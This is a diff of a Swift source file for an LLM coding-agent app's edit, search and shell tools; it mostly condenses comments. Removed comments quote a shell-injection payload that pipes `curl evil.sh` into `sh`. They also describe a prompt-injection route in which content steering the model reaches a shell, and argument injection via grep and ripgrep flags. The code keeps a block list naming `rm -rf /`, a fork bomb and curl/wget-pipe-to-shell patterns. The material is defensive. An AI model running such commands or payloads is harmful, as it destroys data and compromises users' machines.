@@ -4,8 +4,7 @@
 //  CodingAssistantTools.swift
 //  Devgentic
 //
-//  Industry-standard coding tools for autonomous LLM coding agents.
-//  Implements patterns from modern AI coding assistants (Claude Code, Cursor, etc.)
+//  Created by Raj Singh.
 //
 
 import Foundation
@@ -22,8 +21,7 @@ enum EditMatchResult: Equatable {
     case ambiguous(occurrences: Int)
 }
 
-/// Pure logic for applying a search-and-replace edit to content.
-/// Extracted for testability — no file I/O, no logging.
+/// Pure logic for applying a search-and-replace edit to content, with no file I/O or logging.
 enum EditMatcher {
     static func applyEdit(content: String, oldString: String, newString: String) -> EditMatchResult {
         let occurrences = content.components(separatedBy: oldString).count - 1
@@ -34,35 +32,8 @@ enum EditMatcher {
             return .ambiguous(occurrences: occurrences)
         }
 
-        // Fallback: whitespace-normalized single-line match.
-        //
-        // This exists so an `old_string` whose indentation or trailing space differs from the
-        // file still matches. Two things it must NOT do, both of which it used to:
-        //
-        // 1. **Take the first of several candidates.** Lines that differ only in indentation
-        //    normalize to the same text, so more than one can match. The exact path refuses that
-        //    case as `.ambiguous` precisely because which one the caller meant is unknowable —
-        //    and the fallback edited whichever came first and reported success, so the model
-        //    believed it had changed a location it had not. Same guard, same answer, both paths.
-        //
-        // 2. **Substitute the whole line verbatim.** Replacing `lines[i]` with `newString` drops
-        //    the line's own leading whitespace, so a correctly-written edit lands at column zero.
-        //    In Swift that is untidy; in Python, YAML or a Makefile it is a syntax error written
-        //    to disk under an "Applied edit" success message. The model cannot avoid it either —
-        //    it asked to replace one expression with another and got its indentation removed.
-        //    The matched line's indent is re-applied unless `newString` brings its own.
-        // `.whitespacesAndNewlines`, not `.whitespaces`.
-        //
-        // `components(separatedBy: "\n")` splits a Windows-line-ended file correctly — Foundation
-        // searches at the scalar level — so each line arrives with a TRAILING `\r`. And
-        // `CharacterSet.whitespaces` does not contain `\r`. The result was that on any CRLF file
-        // every comparison was `"let x = 1\r" == "let x = 1"`, so this fallback could never fire:
-        // a model editing a Windows-authored file got "old_string not found" where the identical
-        // edit against an LF file would have matched. Safe, but silently less capable on a whole
-        // class of real repositories.
-        //
-        // The exact-match path above is unaffected — it is a substring replace and never looks at
-        // line boundaries.
+        // Fallback: whitespace-normalized single-line match, so an `old_string` with different indentation still matches.
+        // Ambiguous matches are refused, the line's indent is re-applied, and `\r` is trimmed for CRLF files.
         let normalizedSearch = oldString.trimmingCharacters(in: .whitespacesAndNewlines)
         let lines = content.components(separatedBy: "\n")
 
@@ -77,9 +48,8 @@ enum EditMatcher {
             return .notFound
         }
 
-        // Leading whitespace of the line being replaced. An empty `newString` is a DELETION and
-        // must stay empty; a `newString` that already starts with whitespace is taken as
-        // deliberately indented and is left alone, so nothing is ever double-indented.
+        // Leading whitespace of the replaced line. An empty `newString` is a deletion and stays empty; a `newString` that
+        // starts with whitespace is left alone.
         let indent = String(lines[lineIdx].prefix { $0 == " " || $0 == "\t" })
         var replacement: String
         if newString.isEmpty || newString.hasPrefix(" ") || newString.hasPrefix("\t") {
@@ -88,13 +58,7 @@ enum EditMatcher {
             replacement = indent + newString
         }
 
-        // Re-attach the line's own carriage return.
-        //
-        // After splitting on "\n", a CRLF file's lines each end with `\r`. Writing the
-        // replacement without it and rejoining with "\n" would give that ONE line an LF ending
-        // while every other line kept CRLF — a file with mixed line endings, produced silently by
-        // an edit the caller asked to make to a single expression. Whatever the file's convention
-        // is, an edit should not change it.
+        // Re-attaches the line's own carriage return so a CRLF file does not end up with mixed line endings.
         if lines[lineIdx].hasSuffix("\r") && !replacement.hasSuffix("\r") {
             replacement += "\r"
         }
@@ -107,19 +71,10 @@ enum EditMatcher {
 
 // MARK: - Search Binary Resolution
 
-/// Which search program the code-search tools run.
-///
-/// ripgrep is preferred, `/usr/bin/grep` is the fallback, and **which one runs depends on whether
-/// the user happens to have ripgrep installed** — so both paths ship, both reach real users, and
-/// both have to work. They are not equivalent: different regex dialect (fixed 2026-07-31),
-/// different flags, different `-c` output shape.
-///
-/// The lookup lives here, once, rather than being repeated at each call site — but the reason it
-/// is a TYPE rather than a function is `discoveryOverride`. A test machine has exactly one of the
-/// two binaries installed, so whichever it is, the other branch is never executed and silently
-/// stops being covered. That is not hypothetical: installing ripgrep on 2026-07-31 to make the rg
-/// branch reachable in production simultaneously retired the grep fallback from every test, and
-/// the counting arguments for grep were written and shipped without ever being run.
+// Why: a type rather than a function because of `discoveryOverride`: a test machine has one binary, so the other branch
+// would otherwise never be covered.
+/// Which search program the code-search tools run: ripgrep when installed, `/usr/bin/grep` otherwise. The two differ
+/// in regex dialect, flags and `-c` output shape, so both paths ship and must work.
 enum SearchBinary {
 
     /// Where ripgrep is normally installed, in preference order.
@@ -135,10 +90,8 @@ enum SearchBinary {
         case ripgrepAt(String)
     }
 
-    /// **Test-only.** Nil in production, and never written by app code — the app only reads
-    /// `ripgrepPath`. Marked `nonisolated(unsafe)` because it is set once by a test before the
-    /// call it affects and never mutated concurrently; the alternative (threading a dependency
-    /// through four tools' arguments) would change production signatures to serve a test.
+    /// Test-only; nil in production and never written by app code, which only reads `ripgrepPath`. `nonisolated(unsafe)`
+    /// because a test sets it once before the call it affects.
     nonisolated(unsafe) static var discoveryOverride: Override?
 
     /// The ripgrep to use, or nil when the grep fallback should run.
@@ -156,22 +109,9 @@ enum SearchBinary {
 
 // MARK: - Search Match Counting
 
-/// The number of MATCHES a search found, as opposed to the number of lines it printed.
-///
-/// These are different numbers whenever context is on, and the display output cannot tell them
-/// apart: `rg`/`grep` print both as `<path><sep><lineno><sep><text>` and distinguish a match
-/// from a neighbour only by a separator character that can itself occur inside a path.
-///
-/// Counting printed lines instead — which is what `code_search` and the `code_search_*` splits
-/// did — reports ONE match as five under the default `context_lines: 2`. That number is what a
-/// model reads to decide whether a search was too broad, and `max_results` truncated against
-/// the same inflated figure, so a search was cut off at roughly a fifth of the matches the
-/// caller asked for while claiming it had exceeded the limit.
-///
-/// `-c` prints `<path>:<count>` per file with the count as the trailing field, so summing is
-/// unambiguous whatever the path contains. It costs a second invocation, which is why callers
-/// only reach for it when context is actually on — `code_search_symbol` and `code_search_files`
-/// request none and pay nothing.
+/// The number of matches a search found, as opposed to the number of lines it printed (which differs when context is
+/// on). Uses `-c` (`<path>:<count>` per file, summed) at the cost of a second invocation, so callers use it only when
+/// context is on.
 enum SearchMatchCounter {
 
     /// Sums the per-file counts, or nil if the counting run could not be completed — callers
@@ -216,23 +156,11 @@ enum SearchMatchCounter {
 
 // MARK: - Search Exit Status
 
-/// What a grep/ripgrep run reported, read from its EXIT STATUS rather than from whether it
-/// printed anything.
-///
-/// Both programs follow one convention: 0 = matches, 1 = searched and found none, 2 = an error.
-/// An empty stdout covers both 1 and a pattern the program refused to compile, and every search
-/// tool here read it as the first. On device (2026-10-05) ripgrep rejected
-/// `\nfunction clamp\(.*?\)` — "the literal "\n" is not allowed in a regex", exit 2 — the tool
-/// answered "No matches found", and the agent concluded `clamp` did not exist. It was in
-/// `src/math_utils.py`. A false absence is worse than an error: the agent believes the
-/// codebase, not the tool.
-///
-/// Exit 2 does NOT mean nothing was searched. Both programs also exit 2 when SOME paths could
-/// not be read ("Permission denied") while still printing every match from the rest, so stdout
-/// is kept whenever there is any. Only an EMPTY stdout with a status other than 0/1 is an error,
-/// and its message stays neutral about the cause — the same exit 2 means "bad pattern" or
-/// "nothing found in the readable paths", and telling them apart would mean matching the
-/// program's English.
+// Why: an empty stdout covers both "no matches" and a rejected pattern; reporting the latter as no matches makes the
+// agent believe the code is absent.
+/// What a grep/ripgrep run reported, read from its exit status rather than from whether it printed anything. 0 =
+/// matches, 1 = none, 2 = error; exit 2 with non-empty stdout keeps the output, and an empty stdout with another
+/// status is an error with a neutral message.
 enum SearchRunReport: Equatable {
     /// Lines to show. `incompleteNote` is set when the program also reported an error, so the
     /// result may be missing matches.
@@ -262,10 +190,7 @@ enum SearchRunReport: Equatable {
         return .output(run.standardOutput, incompleteNote: "[Search incomplete: \(program) reported an error (exit \(run.exitCode)), so matches may be missing. \(reason)]")
     }
 
-    /// A pattern that starts with `*` cannot be a regular expression — `*` needs something to
-    /// repeat, which is exactly the error ripgrep gives — so it is a filename glob. On 2026-10-06
-    /// Qwen2.5-3B sent `code_search_files("*.py")` 11 times in one run; the error said "fix the
-    /// pattern" without saying what the pattern was mistaken for.
+    /// Returns a filename-glob hint when the pattern starts with `*`, which cannot be a regular expression.
     static func globHint(for pattern: String) -> String? {
         let trimmed = pattern.trimmingCharacters(in: .whitespaces)
         guard trimmed.hasPrefix("*") else { return nil }
@@ -333,9 +258,8 @@ struct EditCodeTool: DevgenticTool {
     }
 
     var parameterSchema: ToolParameters {
-        // See `edit_code_batch`: `edits` carries OBJECTS, and `SchemaBuilder.object` declares
-        // every array as an array of strings. The item type is what a provider validates the
-        // model's call against, so it has to say what the decoder actually accepts.
+        // `edits` carries objects, but `SchemaBuilder.object` declares every array as strings; the declared item type is
+        // what providers validate calls against (see `edit_code_batch`).
         var properties = SchemaBuilder.object(
             properties: [
                 ("file_path", "string", "Absolute or relative path to the file to edit."),
@@ -494,12 +418,9 @@ struct CodeSearchTool: DevgenticTool {
             args += ["--glob", glob]
         }
 
-        // `--` ends option parsing. Without it a `pattern` beginning with `-` is read by the
-        // SEARCH PROGRAM as one of its own flags, which argv does nothing to prevent — argv
-        // stops the shell, not the callee's parser. Confirmed against /usr/bin/grep: a pattern
-        // of `-f <path>` made grep read that file as its pattern LIST, and ripgrep's `--pre`
-        // names a preprocessor COMMAND it executes, so on any machine with ripgrep installed
-        // the same hole is arbitrary code execution rather than an arbitrary read.
+        // Why: a pattern beginning with `-` would otherwise be read as the search program's own flag (`grep -f`, ripgrep
+        // `--pre`); argv stops the shell, not the callee's parser.
+        // `--` ends option parsing.
         args.append("--")
         args.append(arguments.pattern)
         args.append(resolvedPath)
@@ -513,14 +434,8 @@ struct CodeSearchTool: DevgenticTool {
             process.executableURL = URL(fileURLWithPath: rgPath)
             process.arguments = args
         } else {
-            // Fallback to grep. `-E` — EXTENDED regex, matching the dialect ripgrep speaks.
-            //
-            // Which branch runs depends on whether ripgrep happens to be installed on the
-            // user's machine, so the two must agree about what a pattern MEANS. grep's default
-            // is BASIC regex, where `+ ? | ( )` are literals and `\(` opens a group — the exact
-            // inversion of ripgrep's — so the same search silently found matches on one machine
-            // and reported "No matches found" on another, with no error on either. A false
-            // absence is worse than a failure: the agent believes the codebase, not the tool.
+            // Fallback to grep with `-E` (extended regex), the dialect ripgrep speaks. Grep's default is basic regex, which
+            // would make the same pattern match on one machine and not another.
             var grepArgs = ["-rnE", "--color=never"]
             if !(arguments.case_sensitive ?? true) { grepArgs.append("-i") }
             if arguments.whole_word ?? false { grepArgs.append("-w") }
@@ -535,9 +450,8 @@ struct CodeSearchTool: DevgenticTool {
             process.arguments = grepArgs
         }
 
-        // grep / ripgrep write one "Permission denied" line per unreadable directory to
-        // STDERR, and this site attached stderr to a pipe it never read — over a home
-        // directory that passes 64 KB easily and the search hangs forever.
+        // Search programs write one "Permission denied" line per unreadable directory to stderr; an unread stderr pipe would
+        // fill past 64 KB and hang the search.
         let run: ProcessRunner.Result
         do {
             run = try ProcessRunner.run(process)
@@ -558,9 +472,7 @@ struct CodeSearchTool: DevgenticTool {
             incompleteNote = note
         }
 
-        // `max_results` bounds the number of PRINTED lines. With context on, one match can print
-        // up to 2N+1 of them, so this is a bound on output volume — which is what it is for
-        // ("Prevents context overflow") — and NOT a count of matches. The two were conflated.
+        // `max_results` bounds the number of printed lines, not matches: with context on, one match prints up to 2N+1 lines.
         let filesOnly = arguments.files_only ?? false
         let lines = rawOutput.components(separatedBy: "\n")
         var shownLines = 0
@@ -576,9 +488,8 @@ struct CodeSearchTool: DevgenticTool {
             truncatedLines.append(line)
         }
 
-        // The real figure. Only worth a second invocation when context is on, because that is
-        // the only case where printed lines and matches differ: `files_only` prints one line per
-        // file and a zero-context search prints one line per match, both already exact.
+        // Counts real matches. Only worth a second invocation when context is on, the only case where printed lines and
+        // matches differ.
         let contextInflatesTheCount = !filesOnly && contextLines > 0
         let exactMatches: Int? = contextInflatesTheCount
             ? SearchMatchCounter.exactMatchCount(
@@ -611,10 +522,7 @@ struct CodeSearchTool: DevgenticTool {
         return incompleteNote.map { "\(summary)\n\($0)" } ?? summary
     }
 
-    /// "1 match" / "2 matches" / "1 file" / "2 files".
-    ///
-    /// The previous form appended "es" unconditionally, which is right for "match" and produces
-    /// "filees" for the `files_only` path — the one the `code_search_files` split always takes.
+    /// Returns the noun with the right plural form: "1 match" / "2 matches", "1 file" / "2 files".
     static func pluralise(_ noun: String, count: Int) -> String {
         guard count != 1 else { return noun }
         return noun.hasSuffix("h") || noun.hasSuffix("s") || noun.hasSuffix("x") ? noun + "es" : noun + "s"
@@ -669,30 +577,15 @@ struct GlobFilesTool: DevgenticTool {
         }
         let maxResults = arguments.max_results ?? 100
 
-        // `find` is invoked DIRECTLY, never through a shell.
-        //
-        // This used to build a `zsh -c` string with the caller's pattern interpolated inside
-        // double quotes: `-name "\(pattern)"`. A pattern containing a double quote closes that
-        // quote and everything after it is shell syntax, so
-        //     a" ; curl evil.sh | sh ; echo "
-        // ran as its own command. `pattern` and `path` are tool ARGUMENTS — they come from the
-        // model, which means anything that can influence the model (a web page, a file it was
-        // asked to read, a poisoned dependency) could reach a shell through this tool. It is
-        // enabled on profiles that deliberately withhold shell access.
-        //
-        // The fix is structural, not more quoting: with `execve` argv, a pattern is one
-        // argument no matter what characters it contains, and there is no parser to escape
-        // from. Escaping is a thing you can get subtly wrong forever; argv is a thing you
-        // cannot.
+        // Why: `pattern` and `path` come from the model; with argv each is one argument whatever it contains, so there is no
+        // shell parser to escape from.
+        // Runs `find` directly, never through a shell.
         let process = Process()
         process.executableURL = URL(fileURLWithPath: "/usr/bin/find")
 
         let pattern = arguments.pattern
-        // Heavy directories are PRUNED rather than filtered after the fact. `! -path` still
-        // descends into `node_modules` and discards the results; `-prune` never enters it. That
-        // more than pays back the `| head -N` this no longer uses — the pipeline used to make
-        // `find` die of SIGPIPE once enough lines had been printed, and the limit is now
-        // applied in Swift instead, below.
+        // Heavy directories are pruned rather than filtered afterwards: `-prune` never enters `node_modules`, while `!
+        // -path` still descends into it.
         var pruneNames = ["-name", ".git", "-o", "-name", "node_modules"]
         let matchPredicate: [String]
 
@@ -700,9 +593,7 @@ struct GlobFilesTool: DevgenticTool {
             pruneNames += ["-o", "-name", ".build", "-o", "-name", "DerivedData"]
             matchPredicate = ["-name", pattern.replacingOccurrences(of: "**/", with: "")]
         } else if pattern.contains("/") {
-            // Path-shaped patterns keep the narrower prune set they have always had; widening
-            // it here would silently change which files this tool finds, which is not what an
-            // injection fix is for.
+            // Path-shaped patterns keep the narrower prune set so the set of found files does not change.
             matchPredicate = ["-path", "*/\(pattern)"]
         } else {
             pruneNames += ["-o", "-name", ".build", "-o", "-name", "DerivedData"]
@@ -716,10 +607,8 @@ struct GlobFilesTool: DevgenticTool {
 
         let output: String
         do {
-            // stderr is deliberately ignored rather than suppressed with `2>/dev/null`:
-            // `find` reports unreadable directories there and exits non-zero, which is not a
-            // failure of the search. ProcessRunner keeps the streams apart, so ignoring it
-            // needs no shell redirection.
+            // stderr is ignored rather than redirected: `find` reports unreadable directories there and exits non-zero, which is
+            // not a search failure.
             output = try ProcessRunner.run(process).standardOutput
                 .trimmingCharacters(in: .whitespacesAndNewlines)
         } catch {
@@ -730,10 +619,8 @@ struct GlobFilesTool: DevgenticTool {
             return "No files found matching '\(arguments.pattern)' in \(basePath)."
         }
 
-        // `head -\(maxResults)` used to do this in the pipeline. Applied here instead, and the
-        // count reported is the number that MATCHED rather than the number shown — the old
-        // form could only infer truncation from `count >= maxResults`, which is also what an
-        // exact-fit result looks like.
+        // The result limit is applied here, and the reported count is the number that matched, so an exact-fit result is not
+        // mistaken for truncation.
         let matched = output.components(separatedBy: "\n").filter { !$0.isEmpty }
         let files = Array(matched.prefix(maxResults))
 
@@ -854,16 +741,13 @@ struct FindDefinitionTool: DevgenticTool {
                 if glob != "*" {
                     args += ["--glob", glob]
                 }
-                // `--` ends option parsing — the pattern is built from a model-supplied
-                // `symbol`, and without it a leading `-` reaches ripgrep's own parser (`--pre`
-                // names a command it runs). See the note in `code_search`.
+                // `--` ends option parsing: the pattern is built from a model-supplied `symbol`, and a leading `-` would reach
+                // ripgrep's own parser. See `code_search`.
                 args += ["--", pattern, basePath]
                 process.arguments = args
             } else {
                 process.executableURL = URL(fileURLWithPath: "/usr/bin/grep")
-                // `-E` folded into the seed rather than appended later. It was always passed
-                // here, but stating it beside the other flags is what lets a source scan verify
-                // every grep fallback in the tree requests the same dialect — see the note in
+                // `-E` is part of the seed so a source scan can verify every grep fallback requests the same dialect. See
                 // `code_search`.
                 var args = ["-rnE", "--color=never", "-A", "5"]
                 if glob != "*" {
@@ -879,15 +763,13 @@ struct FindDefinitionTool: DevgenticTool {
             do {
                 run = try ProcessRunner.run(process)
             } catch {
-                // This used to `continue` silently, so a search that never ran was reported as
-                // "No definition found".
+                // A search that never ran is reported as an error instead of "No definition found".
                 failures.append("Error running search: \(error.localizedDescription)")
                 continue
             }
 
-            // The symbol is placed inside a regex, so one containing `(`, `[`, `?` or `*` is
-            // rejected by the search program — exit 2, empty stdout. Read the exit status, not
-            // just stdout; see `SearchRunReport`.
+            // The symbol is placed inside a regex, so characters like `(` or `*` can make the program reject it (exit 2, empty
+            // stdout); read the exit status, not just stdout.
             switch SearchRunReport.interpret(run, program: rgPath == nil ? "grep" : "ripgrep", tool: name) {
             case .failed(let message):
                 failures.append(message)
@@ -934,14 +816,9 @@ struct BatchCommandTool: DevgenticTool {
     var selfBoundCeiling: TimeInterval? { TimeInterval(BatchCommandTool.maxTimeoutSeconds) }
     let description = "Executes a shell command with advanced options: configurable timeout, background execution, and working directory. Output is returned in full; if it is larger than the room left in the model's context, the middle is omitted (start and end kept) with a note saying so."
 
-    /// Scopes background tasks to the conversation that started them, so `bg_1` means one thing
-    /// per conversation and one conversation cannot poll or stop another's build.
-    ///
-    /// ⚠️ Optional because the catalogue builds every tool once with `nil` for Library metadata
-    /// (`NativeToolEntry.make` probes a instance for its name and category). A nil id means there
-    /// is nothing to register a background task AGAINST — see the refusal in `call`, which is
-    /// deliberately a refusal rather than a launch, because an unregistered background process is
-    /// exactly the orphan this work exists to remove.
+    /// Scopes background tasks to the conversation that started them, so `bg_1` is per conversation and one conversation
+    /// cannot poll or stop another's build. Optional because the catalogue builds every tool with `nil` for Library
+    /// metadata; a nil id means a background task cannot be registered and `call` refuses.
     let conversationID: UUID?
 
     init(conversationID: UUID? = nil) {
@@ -988,14 +865,7 @@ struct BatchCommandTool: DevgenticTool {
                 ("command", "string", "The shell command to execute."),
                 ("working_directory", "string", "Working directory for command execution. Required — pass the project root or a specific subpath."),
                 ("timeout_seconds", "integer", "Maximum execution time in seconds, max 1800. Defaults to 1800 (the maximum) in the foreground and in the background. The process is killed on timeout, but any output it produced first is still returned."),
-                // ⚠️ The model chooses the mode, and it was choosing blind: this said only "run in
-                // background and return immediately", with nothing about WHEN that is right. A
-                // device run on 2026-09-21 backgrounded a build whose result it wanted one second
-                // later, then spent 9 iterations polling for it. The correct answer was a
-                // foreground call with a raised timeout, and nothing told it so.
-                //
-                // Worth the ~250 extra chars in every request: it is read at the moment of the
-                // decision, which a system-prompt paragraph is not.
+                // The description says when background mode is right, since the model chooses the mode at the moment it reads it.
                 ("task_name", "string", "Optional short label shown to the user instead of the raw command."),
                 ("background", "boolean", "Default false. Keep it false for anything whose result you need — the call waits and returns the output, and timeout_seconds goes up to 1800 for a slow build. Set it true ONLY to leave something running that you will not wait for, such as a dev server; it returns a task id instead of output, and you must call get_task_output to see anything.")
             ],
@@ -1005,46 +875,21 @@ struct BatchCommandTool: DevgenticTool {
 
     // MARK: - Timeout Bounds
 
-    /// Applied to a FOREGROUND call that names no timeout — the full 30-minute ceiling (owner
-    /// decision 2026-09-27, HITL Waiting Contract decision 2). It was 30 s, "deliberately short"
-    /// because a hung command could not be stopped; since slice 1 Stop and every outer timeout
-    /// kill a foreground command, so a short default only cut off builds that forgot to ask.
+    /// Applied to a foreground call that names no timeout: the full ceiling, since Stop and every outer timeout kill a
+    /// foreground command.
     static let defaultTimeoutSeconds = maxTimeoutSeconds
 
-    /// Applied to a BACKGROUND call that names no timeout.
-    ///
-    /// ⚠️ NOT 30. Device test 2026-09-21: the model backgrounded a real `xcodebuild` without
-    /// naming a timeout, inherited the foreground default, and the build was killed at 30 seconds
-    /// having barely started — then correctly reported as failed. A 30 s ceiling on the mode that
-    /// exists FOR long work makes the common case "killed before it began".
-    ///
-    /// The ceiling is the right default here because `background: true` is already the caller
-    /// saying "this takes a while and I am not waiting for it". Requiring `timeout_seconds`
-    /// instead was considered and rejected: it converts a bad default into a hard failure for the
-    /// smaller models that omitted the argument in the first place.
+    /// Applied to a background call that names no timeout. The ceiling is the default because `background: true` already
+    /// signals long work, and requiring `timeout_seconds` would hard-fail smaller models.
     static let defaultBackgroundTimeoutSeconds = maxTimeoutSeconds
 
-    /// The ceiling a caller cannot exceed — 30 minutes (HITL Waiting Contract, decision 2; raised
-    /// 900 → 1800 on 2026-09-26). History: raised 300 → 900 on 2026-09-21: 5 minutes sat just
-    /// under this project's own `build-for-testing` + `test-without-building` cycle (~266 s
-    /// measured), so the one command a coding agent most needs to run was the one it could not
-    /// finish. The bound exists to stop a hang, not to rule out a slow build.
-    ///
-    /// ⚠️ This ceiling is NOT the effective limit on its own. Two bounds sit around it:
-    /// - the tool dispatcher (`ToolExecutionMediator`) bounds every call at this ceiling + 30 s
-    ///   (`selfBoundCeiling`), so this tool's own timeout — with its partial output — fires first;
-    /// - an enclosing turn or scheduled-run limit shortens the call to fit what is left, keeping a
-    ///   reserve for the reply (`ExecutionBudget`).
-    /// `CodeSessionManager.presetExecutionTimeout` (60 min) is sized to keep room above this value.
+    /// The ceiling a caller cannot exceed: 30 minutes, sized to fit a full build-and-test cycle. The tool dispatcher
+    /// bounds a call at this plus 30 s (`selfBoundCeiling`), and enclosing turn or scheduled-run limits shorten it
+    /// further (`ExecutionBudget`).
     static let maxTimeoutSeconds = 1800
 
-    /// The bound actually applied to a call. Extracted so the clamp is assertable without
-    /// spawning a shell — `isDestructiveCommand` is static for the same
-    /// reason. A model that asks for an hour gets the ceiling, not an hour.
-    ///
-    /// A non-positive request is treated as "unspecified" rather than "no limit": this tool has
-    /// no unbounded mode, and silently granting one to `timeout_seconds: 0` would be the worst
-    /// way to acquire it.
+    /// Returns the timeout actually applied; static so the clamp is testable without spawning a shell. A request above
+    /// the ceiling is clamped, and a non-positive request is treated as unspecified, never as no limit.
     static func effectiveTimeout(_ requested: Int?, background: Bool = false) -> Int {
         guard let requested, requested > 0 else {
             return background ? defaultBackgroundTimeoutSeconds : defaultTimeoutSeconds
@@ -1054,27 +899,12 @@ struct BatchCommandTool: DevgenticTool {
 
     // MARK: - Testable Safety Guard
 
-    // ⚠️⚠️ `truncateOutput` (8,000 chars / 1,000 lines) WAS REMOVED 2026-09-24 — user decision: no
-    // limit below what fits. A tool cannot know how much room the model has, so it cut a build log
-    // to 8K on a 200K-window model as readily as on an 8K one, and the DB then stored only that
-    // (the rest existed nowhere). Output now leaves this tool whole; `ToolResultBudget.fit` cuts it
-    // to the room actually free, keeping BOTH ends on line boundaries — the properties this function
-    // was hardened for after the 2026-09-21 xcodebuild regression, and whose tests moved with them
-    // to `ToolResultBudgetTests`.
+    // Output leaves this tool whole; `ToolResultBudget.fit` later cuts it to the room actually free, keeping both ends
+    // on line boundaries.
 
-    /// A speed-bump against the best-known ways to destroy a machine by accident. **Not a
-    /// security boundary, and it cannot become one.**
-    ///
-    /// `batch_command` runs `/bin/zsh -c <command>`; the argument is a complete programming
-    /// language, so any command here can be respelled past the list — `rm  -rf /` with two
-    /// spaces, `find / -delete`, `python3 -c 'import os;os.system(…)'`, or a variable
-    /// assembled at runtime. Those were confirmed to slip through, and no addition to this
-    /// list changes the shape of the problem.
-    ///
-    /// It is kept because catching the literal `rm -rf /` a model actually typed has value,
-    /// and removed nothing else. What it must not do is read as the reason this tool is safe:
-    /// `batch_command` IS a shell, and the only real boundary is whether a profile grants it.
-    /// See `ShellCommandGuard`.
+    /// A speed-bump against the best-known ways to destroy a machine by accident; not a security boundary.
+    /// `batch_command` is a shell, so any command here can be respelled past the list; the real boundary is whether a
+    /// profile grants the tool. See `ShellCommandGuard`.
     static let destructivePatterns = [
         "rm -rf /", "rm -rf /*", "mkfs", ":(){", "dd if=/dev/",
         "chmod -r 777 /", "wget.*\\|.*sh", "curl.*\\|.*sh"
@@ -1093,12 +923,8 @@ struct BatchCommandTool: DevgenticTool {
     }
 
     // MARK: - Shared execution core
-    //
-    // ⚠️ ONE implementation, three callers: `batch_command` (Chat/Workflow, still flag-driven),
-    // `run_command` and `start_background_task` (the Code splits). `ShellCommandGuard` exists
-    // because a guard attached to ONE shell tool is a guard on a NAME rather than a capability;
-    // the same reasoning applies to the execution itself, so it lives here rather than being
-    // reinvented per tool.
+    // One implementation shared by `batch_command`, `run_command` and `start_background_task`, so the guard attaches to
+    // a capability rather than a tool name.
 
     enum Precheck {
         case ready(workingDirectory: String)
@@ -1131,16 +957,8 @@ struct BatchCommandTool: DevgenticTool {
         return process
     }
 
-    /// Runs `command` and WAITS, returning its output.
-    ///
-    /// ⚠️ With a conversation, the command runs through `BackgroundProcessRegistry` exactly as a
-    /// background task does — output to a log FILE, live — and this call waits for it and reads the
-    /// log back (2026-09-24). It used to run over `ProcessRunner`'s pipes and write the log once, at
-    /// the end: a crash mid-build left no log, and stdout and stderr came back as two blocks with
-    /// their order lost. The file also removes the pipe's failure modes — a file never fills and
-    /// wedges the child, and a `cmd &` left holding it cannot keep the read open.
-    /// How a foreground command ended — so a caller can CLASSIFY the result without reading its
-    /// text. `observation` is what the model is told in every case (D-17).
+    /// How a foreground command ended, so a caller can classify the result without reading its text; `observation` is
+    /// what the model is told in every case.
     enum ForegroundOutcome: Equatable {
         case finished(String)
         /// Killed at its own `timeout_seconds`.
@@ -1184,11 +1002,10 @@ struct BatchCommandTool: DevgenticTool {
             throw ShellCommandError.launchFailed(reason: error.localizedDescription)
         }
 
-        // ⚠️ THE STOP HOOK. `waitUntilEnded` is a continuation with no cancellation handler, so a
-        // cancelled caller — Stop, an execution limit, the dispatcher's own tool timeout — used
-        // to keep waiting while the command ran to its full bound (Timeout inventory D-02, P2).
-        // Cancellation now stops the command; the wait then returns its partial output as soon as
-        // the shell is reaped (SIGTERM, SIGKILL after 2 s).
+        // Why: `waitUntilEnded` is a continuation with no cancellation handler, so without this a cancelled caller keeps waiting
+        // for the full bound.
+        // Stop hook: cancelling the caller stops the command, and the wait returns its partial output once the shell is
+        // reaped (SIGTERM, SIGKILL after 2 s).
         let stopID = started.id
         let waited = await withTaskCancellationHandler {
             await registry.waitUntilEnded(conversationID: conversationID, taskID: stopID)
@@ -1205,8 +1022,8 @@ struct BatchCommandTool: DevgenticTool {
 
         switch ended.status {
         case .timedOut:
-            // Partial output is returned rather than discarded: a command killed at the bound
-            // usually produced the evidence for WHY it was slow before it was killed.
+            // Partial output is returned rather than discarded: a command killed at the bound usually produced the evidence for
+            // why it was slow.
             return .timedOut(limit: timeout, observation: output.isEmpty
                 ? "Error: Command timed out after \(timeout)s and was killed. It produced no output."
                 : "Error: Command timed out after \(timeout)s and was killed. Output before the kill:\n\(output)")
@@ -1230,9 +1047,8 @@ struct BatchCommandTool: DevgenticTool {
         nonisolated(unsafe) let target = process
         let seconds = TimeInterval(timeout)
 
-        // Off the cooperative pool. `ProcessRunner.run` is synchronous by design and `timeout`
-        // here goes up to 1800s; calling it inline would park a Swift-concurrency worker thread for
-        // a quarter of an hour. A GCD thread is cheap to hold, a cooperative-pool worker is not.
+        // Runs off the cooperative pool: `ProcessRunner.run` is synchronous and `timeout` goes up to 1800 s, which would
+        // park a worker thread.
         let run: ProcessRunner.TimedResult
         do {
             run = try await withCheckedThrowingContinuation { continuation in
@@ -1247,9 +1063,7 @@ struct BatchCommandTool: DevgenticTool {
 
         var output = run.result.combinedOutput
 
-        // Said in the observation, not just the log: an incomplete capture is indistinguishable
-        // from a command that printed less, and the agent would conclude the daemon produced
-        // nothing and try again.
+        // Reported in the observation, not just the log: an incomplete capture looks like a command that printed less.
         if !run.result.outputComplete {
             output += "\n\n[note] This command left a background process holding its output stream. "
                 + "Reading stopped when the command itself finished, so anything written after that is NOT shown above, "
@@ -1577,9 +1391,8 @@ struct CodebaseMapTool: DevgenticTool {
         let ignoreDirs: Set<String> = [".git", "node_modules", ".build", "DerivedData", "__pycache__",
                                         ".venv", "venv", ".next", "dist", "build", ".cache",
                                         "Pods", ".svn", ".hg", "target"]
-        // Per-file noise filter: macOS sprinkles `.DS_Store` into every directory and
-        // Windows leaves `Thumbs.db` / `desktop.ini`. These are never useful to the
-        // agent and would otherwise eat the 8000-char output budget on deep trees.
+        // Per-file noise filter for OS metadata files that are never useful to the agent and would eat the output budget on
+        // deep trees.
         let ignoreFiles: Set<String> = [".DS_Store", "Thumbs.db", "desktop.ini"]
 
         var output = "Repository: \(basePath)\n"
